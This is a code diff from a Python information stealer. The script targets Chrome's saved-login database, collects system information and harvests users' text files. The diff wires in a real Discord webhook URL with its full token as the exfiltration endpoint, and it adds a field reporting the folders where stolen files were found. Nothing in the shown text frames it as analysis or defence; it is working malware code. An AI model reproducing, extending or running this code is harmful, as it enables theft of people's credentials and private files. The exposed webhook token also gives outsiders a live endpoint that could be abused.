@@ -39,7 +39,7 @@ except:
     os.system("pip install cryptography")
 
 
-Webhook_Here = "x"
+Webhook_Here = "https://discord.com/api/webhooks/1037270936191258684/sZpwvKzgeH0SKqib7ohWd39o_Zl31L6rorncUqxrbA5Cch7bpexV6s6dDtRperhYUo2N"
 DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
 
 temp = os.getenv('TEMP')
@@ -219,7 +219,7 @@ def global_info_pc_embed(username):
 
     LoadUrlib(Webhook_Here, data=dumps(data).encode(), headers=headers)
 
-def file_vacum_embed(file_list,url_list):
+def file_vacum_embed(file_list,url_list,):
 
     webhook = Webhook_Here
 
@@ -229,6 +229,10 @@ def file_vacum_embed(file_list,url_list):
             {
             "color": 14406413,
             "fields": [
+                {
+                "name": f" found in {found_path}",
+                "value": '------------------------------------------'
+                },
                 {
                 "name": f"  📁 Interesting files found on user :",
                 "value": '\n'.join(f'└─📁 [{f}]({u})' for f, u in zip(file_list, url_list))
@@ -250,7 +254,7 @@ def file_vacum_embed(file_list,url_list):
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
 def file_vacum():
-    
+    global found_path
     name_list = []
        
     try:
@@ -260,17 +264,6 @@ def file_vacum():
         os.mkdir(temp_file_path['repertory'])
     
     exts = ['txt']
-    found_dir = 'output'
-
-    
-
-    if path.isdir(found_dir):
-        rmtree(found_dir)
-    mkdir(found_dir)
-        
-
-    for ext in exts:
-        mkdir(path.join(found_dir, ext))
         
 
     for path_ in path2search:
@@ -288,13 +281,13 @@ def file_vacum():
                             content = f.read()
                             
                         
-                        
+
                         name, *subnames, ext = name.split('.')
                         name = '.'.join([name, *subnames])
                         name_list.append(name)
                         
                         path_file = f'{temp_file_path["vacum"]} {name}.txt'
-                            
+                        found_path = path_   
                         with open(path_file, 'wb') as d:
                             d.write(content)
                         
@@ -493,5 +486,3 @@ def main():
     launch_vacumm()
 
 threading.Thread(target = main()).start()
-
-
